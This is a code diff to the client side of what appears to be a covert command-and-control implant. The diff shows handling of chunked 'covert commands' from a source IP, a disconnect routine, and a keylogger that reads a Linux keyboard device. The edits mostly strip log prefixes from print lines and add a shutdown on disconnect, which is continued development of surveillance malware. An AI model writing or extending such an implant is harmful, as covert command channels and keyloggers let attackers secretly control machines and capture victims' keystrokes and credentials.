@@ -219,7 +219,7 @@ class Client:
                         state['current_command'] = command_code
                         state['current_src_ip'] = src_ip
                         state['chunks'] = {}
-                        print(f"\n[+] Receiving covert command from {src_ip}")
+                        print(f"\nReceiving covert command from {src_ip}")
                         print(f"    Expected packets: {total}")
 
                     print(f"[DEBUG] seq={seq}/{state['expected_total']} "
@@ -259,7 +259,7 @@ class Client:
                             state = self._reset_transfer_state()
                             continue
 
-                        print(f"\n[+] Covert command received from {state['current_src_ip']}")
+                        print(f"\nCovert command received from {state['current_src_ip']}")
                         print(f"    Command:      {command_type.name}")
                         print(f"    Payload size: {len(payload)} bytes")
 
@@ -272,6 +272,7 @@ class Client:
 
                         if command_type == CommandType.DISCONNECT:
                             self.revoke_authorization(src)
+                            self.running = False
 
                 except KeyboardInterrupt:
                     break
@@ -503,7 +504,7 @@ class Client:
                     print("[!] Keylogger: no keyboard device found")
                     exit()
 
-                print(f"[*] Keylogger using device: {keyboard_dev.name} ({keyboard_dev.path})")
+                print(f"Keylogger using device: {keyboard_dev.name} ({keyboard_dev.path})")
                 KEYMAP = {
                     ecodes.KEY_A: ('a', 'A'), ecodes.KEY_B: ('b', 'B'),
                     ecodes.KEY_C: ('c', 'C'), ecodes.KEY_D: ('d', 'D'),
@@ -662,7 +663,7 @@ class Client:
         try:
             self.listen_for_covert_commands()
         except KeyboardInterrupt:
-            print("\n[*] Shutting down client...")
+            print("\nShutting down client...")
             self.running = False
 
 
